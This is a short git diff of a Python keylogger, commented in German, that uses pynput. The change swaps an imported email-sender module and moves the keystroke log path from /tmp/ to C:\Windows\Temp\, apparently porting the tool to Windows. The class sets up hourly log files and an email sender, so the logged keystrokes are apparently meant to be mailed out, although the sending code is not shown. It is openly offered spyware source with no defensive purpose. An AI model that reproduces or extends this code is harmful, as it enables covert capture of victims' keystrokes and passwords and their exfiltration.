@@ -2,10 +2,10 @@ from pynput import keyboard
 from datetime import datetime
 from threading import Thread
 import time 
-import email_sender
+import email_sender_modul
 import threading
 
-init_email=email_sender.email_sender_class()
+init_email=email_sender_modul.email_sender_class()
 class keylogger_class:
     def keylogger_funktion(self):
         global old_filename
@@ -13,7 +13,7 @@ class keylogger_class:
         global handle
         global send_go
         send_go=0
-        log_destination = "/tmp/" #Pfad zur Log datei   <--- !!!!!!!MUSS JE NACH OS EDITIERT WERDEN!!!!!!!
+        log_destination = "C:\\Windows\\Temp\\" #Pfad zur Log datei   <--- !!!!!!!MUSS JE NACH OS EDITIERT WERDEN!!!!!!!
         now = datetime.now()
         new_filename = now.strftime("%Y%m%d%H") + ".log"      # zeitabstände
         old_filename = new_filename
